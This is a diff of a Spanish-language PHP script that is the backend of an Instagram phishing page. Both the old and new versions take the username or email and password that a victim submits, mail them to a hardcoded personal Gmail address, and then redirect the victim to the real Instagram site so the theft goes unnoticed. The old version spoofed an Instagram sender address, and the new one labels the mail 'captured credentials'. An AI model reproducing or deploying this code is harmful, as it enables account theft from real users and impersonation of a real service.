@@ -1,21 +1,30 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = trim($_POST["email"]);
-    $password = trim($_POST["password"]);
+    // Capturar los datos del formulario
+    $usuario = isset($_POST['user']) ? trim($_POST['user']) : '';
+    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
 
-    // Validaciones básicas
-    if (!empty($email) && !empty($password)) {
-        $to = "ibarraleonelmatias73@gmail.com"; // Cambia esto a tu correo
-        $subject = "Nuevo inicio de sesión en Instagram";
-        $message = "Correo: $email\nContraseña: $password";
-        $headers = "From: no-reply@instagram.com";
-
-        // Enviar el correo
-        mail($to, $subject, $message, $headers);
-
-        // Redirigir a la página de Instagram original
-        header("Location: https://www.instagram.com");
+    // Validar si los campos están llenos
+    if (empty($usuario) || empty($password)) {
+        echo "Por favor, completa todos los campos.";
         exit();
     }
+
+    // Configuración del correo
+    $destinatario = "ibarraleonelmatias73@gmail.com";  // Reemplaza con tu correo
+    $asunto = "Nuevas credenciales capturadas";
+    $mensaje = "Usuario: " . $usuario . "\nContraseña: " . $password;
+    $cabeceras = "From: no-reply@tudominio.com\r\n";
+
+    // Intentar enviar el correo
+    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
+        // Redirigir a Instagram después del envío
+        header("Location: https://www.instagram.com");
+        exit();
+    } else {
+        echo "Error al enviar el correo.";
+    }
+} else {
+    echo "Acceso no permitido.";
 }
 ?>
